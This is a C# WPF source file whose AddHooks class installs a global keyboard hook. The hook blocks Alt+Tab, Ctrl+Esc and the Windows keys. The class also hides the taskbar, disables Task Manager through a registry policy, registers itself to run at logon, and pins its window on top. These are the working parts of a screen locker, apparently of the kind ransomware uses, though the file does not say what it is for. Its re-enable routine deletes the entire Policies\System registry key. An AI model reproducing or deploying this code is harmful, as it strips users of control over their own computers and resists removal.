﻿using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using Microsoft.Win32;

namespace WpfApp1
{
    public class AddHooks
    {
        [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
		private static extern int SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn, int hMod, int dwThreadId);

        [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
		private static extern int UnhookWindowsHookEx(int hHook);

		private delegate int LowLevelKeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);


        [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
		private static extern int CallNextHookEx(int hHook, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

		private const int WH_KEYBOARD_LL = 13;

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
		private static extern IntPtr LoadLibrary(string lpFileName);

        /*code needed to disable start menu*/
        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);

        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

		public bool Hooked = false;

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;
        public struct KBDLLHOOKSTRUCT
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

		private static int _intLlKey;

		private int LowLevelKeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
        {
            bool blnEat = false;

            switch (wParam)
            {
                case 256:
                case 257:
                case 260:
                case 261:
                    //Alt+Tab, Alt+Esc, Ctrl+Esc, Windows Key, ...
					blnEat = ((lParam.vkCode == 9) && (lParam.flags == 32))  ||
							 ((lParam.vkCode == 27) && (lParam.flags == 32)) ||
							 ((lParam.vkCode == 27) && (lParam.flags == 0)) ||
							 ((lParam.vkCode == 91) && (lParam.flags == 1)) ||
							 ((lParam.vkCode == 92) && (lParam.flags == 1)) ||
							 ((lParam.vkCode == 73) && (lParam.flags == 0));
                    break;
            }

            if (blnEat && Hooked)
            {
                return 1;
            }
            else
            {
                return CallNextHookEx(0, nCode, wParam, ref lParam);
            }
        }


        public void KillStartMenu()
        {
            int hwnd = FindWindow("Shell_TrayWnd", "");
            ShowWindow(hwnd, SW_HIDE);
        }

		private static LowLevelKeyboardProcDelegate _lowLevelKeyboardProcDelegate;
        public void SomeMethod()
        {
            var inst = LoadLibrary("user32.dll").ToInt32();
			_lowLevelKeyboardProcDelegate = LowLevelKeyboardProc;
            _intLlKey = SetWindowsHookEx(WH_KEYBOARD_LL, _lowLevelKeyboardProcDelegate, inst, 0);
        }

        public void KillTaskMngr()
        {
            RegistryKey regkey;
            string keyValueInt = "1";
            string subKey = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
            regkey = Registry.CurrentUser.CreateSubKey(subKey);
            regkey.SetValue("DisableTaskMgr", keyValueInt);
            regkey.Close();
        }

        public void ShowStartMenu()
        {
            int hwnd = FindWindow("Shell_TrayWnd", "");
            ShowWindow(hwnd, SW_SHOW);
        }
        public void EnableTaskMngr()
        {
		    string subKey = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
		    RegistryKey rk = Registry.CurrentUser;
		    rk.DeleteSubKeyTree(subKey);
        }

		public void OnClose() {
			UnhookWindowsHookEx(_intLlKey);
        }

		public void SetAutoRunValue()
		{
			RegistryKey regKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
			regKey.SetValue("MyApp", Assembly.GetExecutingAssembly().Location);
			regKey.Close();
		}

		public void BlockScreen(ref MainWindow window) {
			window.Topmost = true;
		}

		public void UnBlocScreen(ref MainWindow window) {
			window.Topmost = false;
		}

    }
}
